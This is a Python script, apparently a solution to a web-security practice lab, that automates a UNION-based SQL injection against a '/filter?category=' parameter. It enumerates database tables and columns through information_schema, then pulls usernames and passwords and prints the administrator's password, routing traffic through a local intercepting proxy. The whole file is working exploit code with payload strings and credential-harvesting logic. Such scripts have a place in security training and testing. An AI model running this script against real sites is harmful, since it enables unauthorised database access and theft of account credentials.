import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# helper function that performs GET requests; returns response of request in text
def perform_request(url, sqli_payload):
    path = "/filter?category="
    res = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    return res.text

def sqli_users_table(url):
    sqli_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sqli_payload)
    # filter output and extract users table
    soup = BeautifulSoup(res, 'html.parser') # parse HTML response and place into variable
    users_table = soup.find(string=re.compile(".*users_.*"),) # users_ and any characters that come after
    if users_table:
        return users_table
    else:
        return False
    
def sqli_users_columns(url, users_table):
    sqli_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sqli_payload)
    # extract usernames and passwords columns
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile(".*username.*"))
    password_column = soup.find(string=re.compile(".*password.*"))
    if username_column and password_column:
        return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sqli_payload = "' UNION SELECT %s, %s FROM %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sqli_payload)
    # extract the administrator password from the HTML response
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try:
        # script steps 4,5,6 in notes.txt
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s "<url>"' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    
    # step 4: find users table name
    print("[+] Looking for a users table...")
    users_table = sqli_users_table(url)

    if users_table:
        print("[+] Found the users table name: " + users_table)
        # step 5: find username and password column names
        username_column, password_column = sqli_users_columns(url, users_table)

        if username_column and password_column:
            print("[+] Found the username column name: " + username_column)
            print("[+] Found the password column name: " + password_column)
            # step 6: find the administrator's password
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)

            if admin_password:
                print("[+] Found the administrator password: " + admin_password)
            else:
                print("[-] Failed to find the administrator password.")
        else:
            print("[-] Failed to find the username and/or the password columns.")
    else:
        print("[-] Failed to find a users table.")